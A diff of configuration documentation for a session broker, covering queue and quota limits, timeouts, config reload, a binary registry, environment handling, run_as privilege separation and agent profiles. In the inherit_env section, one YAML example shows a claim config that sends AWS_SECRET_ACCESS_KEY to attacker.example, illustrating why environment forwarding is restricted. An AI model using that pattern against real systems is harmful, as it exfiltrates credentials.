+| `max_queue_depth`    | int      | `64`     | How many over-capacity claims may be **parked in the FIFO wait queue at once**. `max_concurrent` bounds live instances; this bounds the claims waiting behind them. Each parked waiter costs a goroutine, a timer and an open HTTP connection for up to `queue_wait_timeout`, so without this bound an over-capacity broker accumulates all three without limit. A claim arriving when the queue is already this deep is refused **immediately** — it is never parked and costs none of the above — with **HTTP 503** `{"error":"capacity queue full"}`. That is a **third distinct message**, so the three capacity refusals are told apart in a response and in the `claim failed` log line without correlating timings: `no capacity` (the cap is full and waiting is switched off), `capacity wait timed out` (this claim waited and gave up), `capacity queue full` (this claim was never allowed to wait). The bound is enforced **before** a capacity slot is taken, so a refused claim holds nothing and the slot counter cannot drift. Queue ordering is unchanged — still strictly FIFO by arrival, with a freed slot handed directly to the oldest waiter. Set it to `0` (or any non-positive value) to mean **unlimited**, restoring the pre-bound behaviour. |
+| `max_leases_per_principal` | int | `0` (off) | How many **live leases one authenticated principal** may hold at once. A claim from a principal already at this limit is refused with **HTTP 429** `{"error":"lease limit reached for this principal"}` — a **quota** answer, not one of the `503` capacity answers, because the broker may have slots to spare. The check runs **before** a capacity slot is taken and before the claim is queued, so an over-quota caller is refused instantly rather than parked only to be refused later, and it holds no slot to leak. It is exact rather than best-effort under parallel claims from one caller: the deciding check happens in the same critical section as the lease insert. **It is enforced only when [`auth:`](#session-broker-nexus-broker) is configured, and never for the anonymous principal** — with no `auth:` block every lease is owned by the same anonymous identity, so applying a per-principal cap there would count the whole broker against one principal and silently become a second, lower `max_concurrent`. A broker with no `auth:` block therefore behaves exactly as it did before this key existed, whatever it is set to. `0` (or any non-positive value) leaves the cap **off**, which is the default: a per-tenant quota is a policy only the operator can size. Restored leases (restart recovery) bypass it for the same reason they bypass `max_concurrent` — refusing a process that is already running would hide it, not stop it. |
+| `max_queued_per_principal` | int | `0` (off) | How many claims **one authenticated principal** may have parked in the FIFO capacity queue at once. It is what stops a single caller looping on `POST /claim` from occupying the whole queue and timing every other tenant's single claim out behind it. Over-quota claims are refused with **HTTP 429** `{"error":"queued claim limit reached for this principal"}`, immediately and without parking. Queue **ordering is not changed** — the queue stays strictly FIFO across all principals, and per-principal fair queueing is explicitly out of scope; this bounds how much of the queue one caller may hold, it does not reorder it. Gated on `auth:` and skipped for the anonymous principal **exactly as `max_leases_per_principal` is**, and off by default for the same reason. |
+| `release_grace`      | duration | `10s`    | How long a **deliberate** release — manual `POST /release`, idle reaping, an overrunning turn, reattach reaping, broker shutdown — waits for an instance to shut its engine down cleanly, after the `shutdown` frame, before the broker escalates. It does **not** bound **crash** teardown and never did: a crash is an unexpected exit, so by the time the broker notices there is no engine left to ask nicely and nothing to wait out — that path frees the lease directly. Escalation is `SIGTERM` to the instance's **process group**, then `SIGKILL` to the same group a fixed `2s` later — see [`POST /release/{lease_id}`](#post-releaselease_id-http-api-not-yaml). The graceful path (frame or `SIGTERM`) always persists the session; the kill is the orphan-prevention backstop. The second window is deliberately not configurable. |
+| `ready_timeout`      | duration | `30s`    | The ceiling on instance **boot**: how long `POST /claim` waits for a freshly spawned instance to dial back on `/instance` and signal ready before the broker gives up, kills the process, reaps it, drops the lease (freeing its capacity slot) and answers **HTTP 504** `{"error":"instance did not become ready in time"}`. It is the value most likely to need raising, because it has to cover process start, engine construction and **every plugin's `Init` and `Ready`** — a claim whose config pulls a long model list, warms a vector store or dials several MCP servers can legitimately take longer than the default, and before this key existed that surfaced as a 504 with nothing an operator could turn. It bounds the claim path only; it is unrelated to `idle_timeout` (a live lease) and `max_turn_duration` (a turn). The **same** window bounds an A2A cold spawn, since the [`agents:`](#agent-profiles-agents) ingress boots instances through the identical spawn spine. **Must be positive** — a non-positive or unparseable value is a **boot failure naming the key**; there is no "wait forever" reading, because an instance that never registers would otherwise hold a capacity slot and an open HTTP connection indefinitely. |
+| `session_report_grace` | duration | `5s`   | How long `POST /claim` waits, **after** the instance has signalled ready, for its session-id report frame. The `nexus.io.broker` plugin sends the report immediately after ready, so this is a short grace window rather than a boot budget. **Exceeding it is not an error**: the claim still succeeds and still returns `200`, just with the `session_id` key **omitted** from the response — the caller then has a usable lease it cannot later `-recall`, and the broker logs one `WARN`. Raise it only if instances are observed returning without a session id under load. **Must be positive** — a non-positive or unparseable value is a **boot failure naming the key**; `0` is not a supported way to skip the wait, because a fresh session whose id is never reported cannot be resumed. |
+| `max_claim_body`     | int      | `1048576` (1 MiB) | Ceiling, in **bytes**, on the `POST /claim` request body. A body past it is refused with **HTTP 400** `{"error":"invalid claim body"}` and **nothing is spawned**. It is sized to the config an operator ships, not to a protocol constant: a claim carries the **whole nexus config inline** (see [`POST /claim`](#post-claim-http-api-not-yaml)), so a deployment with a long `skills:` block, many MCP servers or an inlined system prompt can outgrow a megabyte. **Must be positive** — a non-positive or unparseable value is a **boot failure naming the key**; `0` would reject every claim. The A2A ingress's own body cap is a fixed 1 MiB and is **not** this key: a JSON-RPC envelope carries a message, not a config, so it has no reason to grow with one. |
+| `state_dir`          | string   | *(empty)* | Per-broker directory holding this broker's **lease journal** (`leases.jsonl`), its **session → binary index** (`session-binaries.jsonl`), its **A2A context → session index** (`a2a-contexts.jsonl`) and **A2A task store** (`a2a-tasks.jsonl`, both written only when `agents:` is configured), its **spawn-secret derivation key** (`spawn-key`, mode `0600`) and, when `broker_id` is unset, its generated identity (`broker-id`). Funneled through `ExpandPath` (supports `~`). **Empty (the default) disables lease persistence entirely**: nothing is written, no directory is created, spawn secrets stay random per spawn, restart recovery does not run, neither the session → binary index nor the A2A context index exists (an A2A conversation is then resumable only for as long as this process lives), the A2A task store is memory-only (`GetTask`/`ListTasks`/`SubscribeToTask` still answer, but only for tasks this process ran — see [A2A task retention](#a2a-task-retention-a2atasks)), and the broker behaves exactly as it did before this key existed — it logs one `WARN` at startup saying lease state is in-memory only. **Must not be shared between brokers**: two brokers pointed at one directory would append to the same journal and compact each other's live leases away. Created on demand (mode `0700`); a `state_dir` that is set but unusable **fails startup**. See [Lease durability](#lease-durability-state_dir), [A2A context → session index](#a2a-context--session-index-a2a-contextsjsonl) and [Restart recovery](#restart-recovery-reattach_window) below. |
 | `broker_id`          | string   | *(empty)* | The identity stamped on every persisted lease record, alongside `advertise_addr`, so a future shared store can tell whose lease is whose. Must be **stable across restarts** of the same broker. Empty (the default) means the broker generates one on first boot and persists it at `<state_dir>/broker-id`, reusing it thereafter — stable and unique with no operator effort. Set it explicitly to give a broker a name that means something in a cluster (`broker-eu-1`). Irrelevant while `state_dir` is unset, since nothing is then recorded. |
 | `reattach_window`    | duration | `60s`    | How long a lease **restored from the journal after a restart** may wait for its instance to reconnect before the broker reaps it (kills the process, frees the slot, closes the record out through the shared `POST /release` teardown). Only restored leases are subject to it; an ordinary claimed lease is never touched. A restored lease that reattaches inside the window becomes a fully ordinary lease — idle sweeping, crash watching, ownership checks and `POST /release` all apply to it unchanged. A non-positive value **falls back to the 60s default rather than disabling the reaper**: "wait forever" would leave a capacity slot held by an instance that is never coming back, which is the orphan restart recovery exists to remove. Irrelevant while `state_dir` is unset, since nothing is then restored. See [Restart recovery](#restart-recovery-reattach_window) below. |
-| `auth`               | map      | *(absent)* | Client authentication for the control-plane routes, **and** the gate for instance dial-back spawn-secret enforcement on `WS /instance`. **Absent means authentication is disabled** and every route behaves exactly as it did before the key existed; the broker logs one `WARN` at startup saying so. A **malformed** block is a boot failure naming the offending key — it never falls back to disabled. **Restored leases are the one exception**: they always require the spawn secret, whatever this key says (see [Restart recovery](#restart-recovery-reattach_window)). See [Authentication](#authentication-auth) below. |
+| `auth`               | map      | *(absent)* | Client authentication for the control-plane routes. It does **not** govern the instance dial-back on `WS /instance`, which always requires the per-spawn secret. **Absent means authentication is disabled** and every route behaves exactly as it did before the key existed; the broker logs one `WARN` at startup saying so. A **malformed** block is a boot failure naming the offending key — it never falls back to disabled. See [Authentication](#authentication-auth) below. |
+| `a2a`                | map      | *(absent)* | Settings shared by every [`agents:`](#agent-profiles-agents) profile. Today it holds one sub-block, `a2a.tasks`, which bounds the durable A2A **task store**. It is separate from `agents:` because nothing in it is per profile: the store is one file, with one retention policy, for the whole broker. Absent means every default below applies. See [A2A task retention](#a2a-task-retention-a2atasks). |
+| `a2a.tasks.ttl`      | duration | `24h`      | How long a **terminal** task stays readable after its last transition. `"0s"` keeps every task until a cap evicts it. Must be a duration **string** (`"24h"`, `"90m"`) — a bare number fails the boot rather than being read as nanoseconds. A negative value is a boot failure naming the key. See [A2A task retention](#a2a-task-retention-a2atasks). |
+| `a2a.tasks.max_per_context` | int | `50`   | How many tasks are kept per (**caller**, `contextId`) pair. `0` disables the cap. The cap is per caller as well as per context so one principal's traffic cannot evict another's — an eviction channel is still a channel. Only **terminal** tasks are evictable; a live task counts against the cap but is never dropped. A negative value is a boot failure. See [A2A task retention](#a2a-task-retention-a2atasks). |
+| `a2a.tasks.input_timeout` | duration | `15m` | How long a task may sit at `TASK_STATE_INPUT_REQUIRED` before the broker abandons it: the task is driven to `TASK_STATE_FAILED` and the instance is told to cancel the turn. `"0s"` disables the deadline. This is also the **queue deadlock policy** — a parked task holds its conversation's serial queue and its leased instance, so without a deadline one unanswered question would strand every message behind it. Must be a duration string; a negative value is a boot failure. See [Serial task queueing](#serial-task-queueing). |
+| `agents`             | map      | *(absent)* | The named **A2A agent profiles** this broker publishes, keyed by the name their routes are namespaced under. Each profile binds a Nexus config, a `binaries:` entry and an Agent Card, so a third-party A2A client can address an agent by URL instead of supplying the full nexus config `POST /claim` demands. Entry fields are listed under [Agent profiles](#agent-profiles-agents) below. **Absent (the default) means this broker has no A2A ingress at all** — no routes are registered and nothing new appears in the boot log, so a `broker.yaml` written before profiles existed behaves exactly as it did. Validated at boot: an empty or non-URL-safe profile name, a name that collides with another after trimming, a missing `config`, a `binary` that is not in the registry, a card missing a required field, or a config file that does not resolve to a readable file **fails startup**.
+
+### Reloadable keys (`SIGHUP`)
+
+The broker re-reads its config file on **`SIGHUP`** and applies the reloadable
+half of it in place, so adding a `binaries:` variant or publishing an `agents:`
+profile no longer costs a restart — and a restart is the single event that costs
+every lease whose instance fails to reattach within
+[`reattach_window`](#session-broker-nexus-broker).
+
+```bash
+kill -HUP "$(pgrep -f nexus-broker)"
+```
+
+**`SIGHUP` is the only trigger.** There is deliberately no `POST /reload`:
+`admin_scope` is a read-only capability ("visibility only — there is no admin
+bypass on release or connect"), and a mutating admin route would be the first
+exception to that.
+
+A reload is **validate-then-swap and atomic**. The file goes through exactly the
+boot loader, so a value that would have failed startup fails the reload; the
+Agent Cards are re-rendered before anything is published; and only when every
+step has succeeded is the new configuration swapped in, in one step. A reload
+that fails at any point leaves the previous configuration **entirely** in force
+and logs the reason — there is no half-applied state. Outcomes are logged as
+`config reload applied` (naming the keys that changed) or
+`config reload rejected` (naming the reason).
+
+**Live leases are never disturbed.** A reload changes what the *next* claim can
+spawn; it never signals, kills or re-binds a running instance. That includes
+removing a `binaries:` entry a live lease was spawned from: the lease records the
+entry *name*, the process is already running, and a later resume against a name
+this broker no longer offers is refused with the existing `409`.
+
+| Key | Reloadable? | Notes |
+|---|---|---|
+| `binaries` (and its folded inputs `nexus_binary_path`, `run_as`) | **Yes** | The next claim resolves its entry from the new registry. Paths are re-resolved, so a reload naming a missing or non-executable binary is **refused** exactly as a boot would be. |
+| `inherit_env` | **Yes** | Applies to the next spawn. |
+| `agents` | **Yes**, with one exception | Profiles may be added, changed or removed and the Agent Cards are re-rendered and swapped **as a unit**. The exception: a broker that booted with **no** `agents:` block registered no A2A routes and opened neither the context index nor the durable task store, so a reload cannot switch the ingress on — that change is reported and ignored. Removing the last profile is allowed; the routes then answer `404 unknown agent profile`. |
+| `max_concurrent` | **Yes** | Raising it immediately admits claims already parked in the capacity queue. Lowering it **never evicts** a live lease: the broker sits over its cap and admits nothing new until it drains back under. |
+| `idle_timeout`, `max_turn_duration` | **Yes** | The sweeper re-reads both each pass, and re-derives its tick interval, so switching reaping on or off takes effect within one poll. |
+| `queue_wait_timeout` | **Yes** | Applies to the next claim; a claim already parked keeps the bound it parked under. |
+| `release_grace` | **Yes** | Applies to the next release, manual or swept. |
+| `ready_timeout`, `session_report_grace`, `max_claim_body` | **Yes** | Applies to the next claim. |
+| `listen_addr` | **No** | Changing it means a new listener, which is a restart. |
+| `advertise_addr` | **No** | Stamped into each lease record at registration; changing it live would make this process's own records disagree. |
+| `state_dir` | **No** | The lease journal, spawn key and both indexes are already open against the old directory, and restart recovery has already run. |
+| `broker_id` | **No** | Already stamped on every record this broker has written; changing it live would orphan its own leases at the next boot. |
+| `auth` (including `auth.admin_scope`) | **No** | The `jwks` validator holds a live `kid` cache with rate-limited fetches, and two documented guarantees rest on it surviving: key rotation needs no restart, and an unreachable issuer never turns into an allow. Rebuilding the chain would discard that cache, so a reload performed during an IdP outage would turn a working broker into one that denies every JWT. |
+| `reattach_window` | **No** | Consumed once, at boot, by the restored-lease reaper. |
+| `client_replay_buffer_bytes` | **No** | Stamped on a lease's stream when the lease is created. |
+| `max_queue_depth`, `max_leases_per_principal`, `max_queued_per_principal` | **No** | Admission state held by the registry rather than read per request. |
+| `a2a.tasks.*` | **No** | Sizes a durable store that is already open, on the same footing as `state_dir`. |
+
+A boot-only key whose value **changed** in the reloaded file is reported in a
+startup-style `WARN` naming every such key and is **ignored** — the value in
+force is unchanged. The reloadable keys in the same document still apply: a
+boot-only change is not a reason to refuse everything around it.
+
+### Values that stay constants
+
+Not every number in the broker is a key. These are fixed on purpose, and the
+reason differs per value:
+
+| Value | Fixed at | Why it is not a key |
+|---|---|---|
+| WebSocket **ticket TTL** | `30s` | A ticket travels in a **URL query parameter** — a browser cannot set a header on a WebSocket handshake — so it lands in reverse-proxy access logs, browser history and referrer chains no matter what the broker does. Its tightness plus its **single use** *are* the mitigation for that exposure, so letting an operator widen it would let them silently remove the only thing that makes the design safe. A dropped socket is answered by [`POST /ticket/{lease_id}`](#post-ticketlease_id-http-api-not-yaml) minting a fresh one, not by a longer window. |
+| `SIGTERM` → `SIGKILL` gap | `2s` | Not the operator's shutdown budget — [`release_grace`](#session-broker-nexus-broker) is, and it has already elapsed by the time this window opens. This is only the interval between "we have now actually asked the OS" and "we stop asking". |
+| **Instance drain grace** | `2s` | The window a teardown gives the broker's *own* instance read pump to finish draining a dead instance's socket before the connection is closed. It opens only **after** the process has been reaped, so the socket is already closed at the far end and the next read returns `EOF` — the wait is normally microseconds, and the bound exists purely for a **half-open** socket the OS never tore down. It is not a shutdown budget (`release_grace` is, and it does not apply to a crash), and an operator lengthening it could only delay a teardown, never recover more frames. Exceeding it logs a `WARN` naming the lease. |
+| A2A request body cap | 1 MiB | A JSON-RPC envelope carries a **message**, not a config, so it has no reason to grow with an operator's profiles the way [`max_claim_body`](#session-broker-nexus-broker) does. |
+| Lease-journal compaction interval, session→binary index cap | 512 appends, 4096 entries | Internal storage tuning with no operator-visible behaviour to trade off. |
+
+### Binary registry (`binaries`)
+
+One broker can front several `nexus` builds — a base binary, a vision-enabled
+build, a pinned older release — instead of the single spawn target
+`nexus_binary_path` allowed. Each entry is keyed by the **name a claim selects
+it by**; the key is the name, so an entry cannot disagree with itself.
+
+```yaml
+binaries:
+  nexus:                                    # reserved; declare it only to override the path
+    path: "/usr/local/bin/nexus"
+  vision:
+    path: "~/builds/nexus-vision"           # ExpandPath applies here too
+    label: "Nexus (vision)"
+    description: "Multimodal build with the image tools compiled in"
+    args: ["-profile", "vision"]
+    env:
+      NEXUS_VISION: "1"
+```
+
+| Entry field   | Type              | Default    | Description                                                                 |
+|---------------|-------------------|------------|-----------------------------------------------------------------------------|
+| `path`        | string            | *(required)* | The executable the broker exec()s for this entry. Funneled through `ExpandPath` (supports `~`). A value with **no path separator** (`nexus`, `nexus-vision`) is looked up on the broker process's `PATH`; anything else is used as a location on disk, relative to the broker's working directory if it is not absolute. **Required** — an empty or missing `path` fails startup naming the entry. It is deliberately not defaulted to the entry name, which would turn a typo into a silent `PATH` lookup for a binary the operator never meant to run. Resolved and verified at boot — see [Binary resolution](#binary-resolution). |
+| `label`       | string            | *(empty)*  | Short human-readable name for operator/client surfaces (`"Nexus (vision)"`). Purely presentational; nothing routes on it. Consumers fall back to the entry name when empty. |
+| `description` | string            | *(empty)*  | One-line explanation of what this variant is for, for the same surfaces as `label`. Purely presentational. |
+| `args`        | list of string    | *(empty)*  | Extra argv entries for this variant, appended **after** the broker's own spawn arguments so they can add to the command line but never displace the `-config` / `-recall` contract the instance protocol depends on. |
+| `env`         | map string→string | *(empty)*  | Extra environment variables for this variant, layered **over** what the spawn inherited from the broker (the always-pass set and [`inherit_env`](#instance-environment-inherit_env)) and **under** the broker-owned `NEXUS_BROKER_*` variables. Those name the dial-back address, the lease and the spawn secret; the broker's values always win, so an entry cannot point an instance at another broker, hand it the wrong lease, or supply its own spawn secret. This is where a value that is a property of the **variant** belongs; `inherit_env` is where a value that lives in the **broker's own environment** belongs. |
+| `run_as`      | map               | *(absent)* | The OS credential **this entry's** instances are exec()d under: `uid` and `gid`, both required whenever the block is written. Overrides the broker-level [`run_as`](#session-broker-nexus-broker) outright — an entry that declares it does not merge with the default. Absent and with no broker-level default, instances run as the broker's own user, which is what every spawn did before this key existed. When it is set, **`HOME` follows the credential**: the spawn's `HOME` is the `run_as` user's home directory from the passwd database, unless this entry's `env` sets `HOME` itself. A uid whose home cannot be resolved and whose entry does not set `env.HOME` **fails startup** naming the entry. Supplementary groups are **dropped** (`setgroups(0, NULL)`), so the instance holds only the declared gid. See [Running instances as another user](#running-instances-as-another-user-run_as). |
+
+**Selecting an entry.** A claim picks one with the optional `binary` field of
+its request body — see [`POST /claim`](#post-claim-http-api-not-yaml). An unknown
+name is rejected with **HTTP 400** before the claim allocates anything.
+
+**Discovering the entries.** Clients read the live registry from
+[`GET /binaries`](#get-binaries-http-api-not-yaml), which returns `name`, `label`
+and `description` per entry — never `path`, `args` or `env`.
+
+**The `nexus` name is reserved.** After a successful load the registry always
+contains it, so the base binary is spawnable from every broker no matter what
+the config says. There is deliberately **no `default: true` field**: a claim
+that names no binary always means `nexus`, so an operator cannot silently
+change what an existing client ends up spawning.
+
+**Folding the deprecated `nexus_binary_path`.** The two keys are resolved at
+boot, from the same file, in exactly four cases:
+
+| `nexus_binary_path` | `binaries.nexus` | Result |
+|---|---|---|
+| absent  | absent  | `nexus` synthesized with path `nexus` — the historical zero-config default, unchanged. |
+| set     | absent  | The value becomes the `nexus` entry's `path`, and one `WARN` names `binaries.nexus.path` as the replacement. Every pre-registry deployment boots unchanged. |
+| absent  | set     | Taken as written; nothing to fold. |
+| set     | set     | **Boot failure** naming both keys. Picking a winner would mean half the operators hitting it silently spawn the binary they did not mean, and the mistake would only surface as instances behaving oddly. |
+
+### Instance environment (`inherit_env`)
+
+A claimed instance is handed a config **the caller wrote**, and every Nexus
+provider resolves its credential from an environment variable that config
+*names* — `api_key_env` and its equivalents — while the same config chooses
+`base_url`. So an environment variable that reaches an instance is not merely
+visible to it, it is postable anywhere by whoever claimed the lease:
+
+```yaml
+# a claim body's `config`, which the broker execs an instance against
+core:
+  models:
+    default:
+      provider: openai
+      api_key_env: AWS_SECRET_ACCESS_KEY    # any variable the process holds
+      base_url: https://attacker.example    # where its value gets sent
+```
+
+An allowlist of *known* provider key names cannot bound that, because the caller
+picks the name. The broker therefore builds a spawn's environment from scratch
+rather than inheriting its own, in this order (later wins, since `exec` resolves
+a duplicated key to its last occurrence):
+
+1. **The always-pass set** — `HOME`, `LANG`, `PATH`, `TZ` — taken from the
+   broker's environment regardless of configuration. These are not credentials
+   and are not optional: `HOME` is what resolves `~/.nexus`, so without it an
+   instance cannot create a session directory and `-recall` has nothing to
+   resume; `PATH` is what makes `exec` and the shell tool work at all; `TZ` and
+   `LANG` decide how the instance renders times and text.
+2. **Everything `inherit_env` names**, taken from the broker's environment. A
+   name the broker does not hold is **skipped rather than exported empty** — an
+   instance can tell "unset" from "set to the empty string", and a provider
+   handed `api_key_env=""` fails less legibly than one that finds the variable
+   absent.
+3. **The selected entry's `env`** map, applied in sorted key order. This is the
+   per-variant declaration point, and it *sets* a value rather than forwarding
+   one, so it can also override something step 1 or 2 contributed.
+4. **The three broker-owned variables** — `NEXUS_BROKER_ADDR`,
+   `NEXUS_BROKER_LEASE_ID`, `NEXUS_BROKER_SPAWN_SECRET`. Last, always, so
+   nothing an entry or the broker's shell contributes can point an instance at a
+   different broker, hand it another lease's id, or supply its own spawn secret.
+
+Steps 1–3 are emitted in sorted key order, so the environment a spawn is handed
+is byte-identical across restarts.
+
+At boot the broker logs **one line per registry entry** naming exactly the
+variables that entry's spawns will carry — names only, never values:
+
+```
+level=INFO msg="binary registry entry" name=vision path=/opt/builds/nexus-vision \
+  resolved_path=/opt/builds/nexus-vision \
+  spawn_env=ANTHROPIC_API_KEY,HOME,LANG,NEXUS_BROKER_ADDR,NEXUS_BROKER_LEASE_ID,NEXUS_BROKER_SPAWN_SECRET,NEXUS_VISION,PATH,TZ
+```
+
+Because the line reports what will be **carried** rather than what was declared,
+a name that is missing from it was never in the broker's own environment. Those
+are also collected into one startup `WARN`:
+
+```
+level=WARN msg="inherit_env names variables this broker's own environment does not hold, ..." missing=ANTHROPIC_API_KEY
+```
+
+```yaml
+# broker.yaml — forward two provider keys the broker was started with
+inherit_env:
+  - ANTHROPIC_API_KEY
+  - OPENAI_API_KEY
+
+binaries:
+  vision:
+    path: /opt/builds/nexus-vision
+    env:
+      NEXUS_VISION: "1"          # set outright, not forwarded
+```
+
+Use `inherit_env` when the value lives in the broker's own environment (a secret
+injected by systemd, Kubernetes or a secrets agent) and `binaries.<name>.env`
+when the value is a property of the variant. A claim's own `config` can of
+course still carry a credential inline, in which case neither key is involved.
+
+**There is no wildcard.** `inherit_env: ["*"]` is not supported and is not
+planned: it would restore exactly the exfiltration primitive above, and because
+the caller picks the variable name in its own config, "forward everything except
+the risky ones" is not a line anybody can draw.
+
+**This is a breaking change** for a broker that predates the key — a spawn used
+to take `os.Environ()` wholesale, so an instance whose config expects to read
+`ANTHROPIC_API_KEY` from the environment now fails to reach its provider on the
+first turn unless the name is declared here or set in the entry's `env`. The
+migration is in
+[Upgrading an existing broker](../guides/session-broker.md#upgrading-an-existing-broker).
+
+`inherit_env` is [reloadable](#reloadable-keys-sighup) and applies to the next
+spawn.
+
+### Running instances as another user (`run_as`)
+
+Without `run_as`, every claimed instance runs as the **broker's own uid** with
+the broker's `HOME`. The process boundary between two claims is then not a
+privilege boundary: one tenant's instance can read every other tenant's session
+directory under `~/.nexus/sessions/`, and it can read `<state_dir>/spawn-key` —
+which is enough to derive any live lease's dial-back secret and impersonate its
+instance. `run_as` is what turns a separate process into a separate principal.
+
+```yaml
+# broker.yaml
+run_as:                       # the default for every entry that declares none
+  uid: 1500
+  gid: 1500
+
+binaries:
+  vision:
+    path: /opt/builds/nexus-vision
+    run_as:                   # replaces the default outright — not merged
+      uid: 1501
+      gid: 1501
+
+  support:
+    path: /opt/builds/nexus-support
+    run_as:
+      uid: 1502
+      gid: 1502
+    env:
+      HOME: /var/lib/nexus/support   # operator-set data dir; wins over the passwd home
+```
+
+- **Per entry over a broker default.** The interesting separation is between
+  *variants*: a vision build and a support agent want to be apart from each
+  other, not merely from the host. An entry that writes `run_as` replaces the
+  broker-level block **wholesale** — a uid taken from one place and a gid from
+  another is a credential nobody wrote down.
+- **Both fields are required** whenever the block is written. A uid without a gid
+  leaves instances in the broker's primary group, so their session files stay
+  reachable from it — a boundary that looks complete in the config and is not one
+  on disk.
+- **Ids are numeric**, not user names. Resolving a name needs the passwd
+  database, which a hardened container may not carry, and a name that resolves
+  differently on two hosts is a silent privilege change.
+- **`HOME` follows the credential.** `HOME` is what resolves `~/.nexus`, so an
+  instance dropped to another uid while still pointed at the broker's home cannot
+  create its session directory and every claim fails at the first write. The
+  broker therefore resolves the `run_as` user's home from the passwd database at
+  boot and gives the spawn that `HOME`; an entry's `env.HOME` overrides it and is
+  the way to put instance state somewhere other than a home directory. A uid with
+  no resolvable home and no `env.HOME` **fails startup**, naming the entry and
+  the key that fixes it.
+- **Sessions are consistent per registry entry.** Two entries running under
+  different credentials keep their sessions in different trees. Resume stays
+  correct because a session already records the entry that created it and a
+  resume under a different entry is refused with **409** — see
+  [Resume inherits the recorded binary](#resume-inherits-the-recorded-binary) —
+  so a session can never be replayed under an entry whose `HOME` would not
+  contain it.
+- **Supplementary groups are dropped.** The child calls `setgroups(0, NULL)`, so
+  it holds only the declared gid; keeping the broker's group memberships would
+  leave the instance able to reach most of what the key exists to take away.
+
+**The broker must be privileged.** Setting a child's credentials — including
+dropping supplementary groups — requires **root**, or `CAP_SETUID` and
+`CAP_SETGID` on Linux. This is true even when the `uid` named is the broker's
+own. A broker configured with `run_as` that lacks the privilege logs one `WARN`
+at boot:
+
+```
+level=WARN msg="run_as is configured but this broker does not run as root, ..." euid=501
+```
+
+and every claim that selects such an entry fails **at spawn**, immediately, with
+**HTTP 500** `{"error":"spawning instance"}` and a broker-side log line naming
+the refused credential — not a claim that hangs until the ready timeout.
+
+Each entry's credential and resolved home appear in the boot log beside its path
+and spawn environment:
+
+```
+level=INFO msg="binary registry entry" name=vision path=/opt/builds/nexus-vision \
+  resolved_path=/opt/builds/nexus-vision spawn_env=… run_as=1501:1501 run_as_home=/home/nexus-vision
+```
+
+**What `run_as` does not do.** It separates instances **by OS user**, and that is
+the whole of it. It does not sandbox the filesystem, restrict the network, or
+bound CPU and memory — a claim still supplies the whole engine config, and the
+shell and file tools still run with whatever that uid can reach. It does not
+separate two instances of the **same** entry from each other: they share a
+credential and a session tree. Nor does it protect an instance from the
+*claimant*, who chose its config and drives its tools.
+
+Leaving `run_as` unset is therefore a statement that every caller of this broker
+may read every other caller's sessions and its `spawn-key`. That is fine inside
+one trust domain and is not fine between two — **deploy one broker per trust
+domain, or set `run_as`**. See
+[Trust boundaries](../guides/session-broker.md#trust-boundaries).
+
+### Binary resolution
+
+Every registry entry — including the reserved `nexus` one, and including the
+value folded in from a deprecated `nexus_binary_path` — is resolved and verified
+**once, at startup**, before the gateway listens. The steps, in order:
+
+1. **Expand.** `~` and `~/…` are expanded through `ExpandPath`, as everywhere
+   else in Nexus.
+2. **Look up bare names on `PATH`.** A `path` containing no path separator is
+   resolved against the broker process's own `PATH`. This is what makes the
+   zero-config `path: "nexus"` work, and it is allowed for **every** entry, not
+   just the reserved one.
+3. **Make absolute.** The result is turned into an absolute path, so spawning is
+   unaffected by the broker's working directory.
+4. **Stat and check.** The path must exist, be a regular file (symlinks are
+   followed), and carry at least one execute bit.
+
+Any failure at any step **refuses the boot**, with an error naming the entry, the
+path that was resolved, and the specific reason (`no such file`, `is a
+directory`, `is not executable (mode …)`, `not found on PATH`). The resolved
+absolute path is then held for the process lifetime, so a claim performs no
+filesystem work and a `PATH` lookup cannot answer differently mid-flight.
+
+At startup the broker logs one line per entry carrying both the configured
+`path` and the `resolved_path`, so a surprising `PATH` answer — a stale build in
+`~/go/bin` shadowing `/usr/local/bin` — is visible in the boot log rather than
+inferred later from an instance behaving oddly.
+
+> **Behaviour change.** A broker whose registry names a missing, non-executable,
+> or directory path now **fails to start**. That includes a **zero-config broker
+> with no `nexus` on its `PATH`**, which previously started fine and only failed
+> at the first `POST /claim`. The tradeoff is deliberate and one-sided: a broker
+> restarted midway through a variant rollout, while a binary is momentarily
+> absent, will not come up — but an operator learns about a typo or a missing
+> build at deploy time instead of from a user's failed claim.
+
+### Agent profiles (`agents`)
+
+An **agent profile** is one public agent this broker fronts: a Nexus config to
+boot, a [binary registry](#binary-registry-binaries) entry to boot it with, and
+the Agent Card that describes the result to the world. Each profile publishes its
+own [A2A](https://a2a-protocol.org) endpoints under its own path namespace.
+
+Profiles exist because [`POST /claim`](#post-claim-http-api-not-yaml) cannot be
+an A2A front door: a claim carries the **full nexus config as inline YAML**,
+which no third-party A2A client can supply — it does not know Nexus exists, let
+alone which plugins to activate. A profile moves that decision broker-side, so
+the client names an agent by URL and the operator decided long ago what running
+that agent means.
+
+> **Rejected alternative:** carrying the Nexus config through A2A
+> `Message.metadata`. That works only for Nexus-aware clients, which defeats the
+> point of speaking a standard protocol.
+
+```yaml
+agents:
+  support:                                  # the name every route is namespaced under
+    binary: nexus                           # optional; omitted means the reserved `nexus` entry
+    config: "~/agents/support.yaml"         # ExpandPath applies here too
+    card:
+      name: "Support Agent"
+      description: "Answers customer questions from the product knowledge base."
+      version: "1.2.0"
+      documentation_url: "https://acme.example/docs/support-agent"
+      icon_url: "https://acme.example/icons/support.png"
+      provider:
+        organization: "Acme"
+        url: "https://acme.example"
+      default_input_modes: ["text/plain"]
+      default_output_modes: ["text/plain"]
+      skills:
+        - id: "answer"
+          name: "Answer questions"
+          description: "Answers a customer question and cites its sources."
+          tags: ["support", "qa"]
+          examples: ["How do I rotate my API key?"]
+  research:
+    binary: vision                          # any entry of the binaries registry
+    config: "~/agents/research.yaml"
+    card:
+      name: "Research Agent"
+      description: "Reads documents and summarizes them."
+      version: "0.1.0"
+      skills:
+        - id: "summarize"
+          name: "Summarize"
+          description: "Summarizes a supplied document."
+```
+
+| Profile field | Type   | Default             | Description |
+|---------------|--------|---------------------|-------------|
+| `binary`      | string | `nexus` (reserved)  | Which [`binaries:`](#binary-registry-binaries) entry this profile spawns. **Omitted means the reserved `nexus` entry**, exactly as an omitted `binary` on `POST /claim` does — an omitted binary has one meaning in this broker, not two. An **unknown** name is a **boot failure** naming the alternatives, not a fallback to `nexus`: quietly spawning the base binary for an agent an operator bound to a vision build produces a session that merely behaves oddly, which is far harder to diagnose than a refusal. |
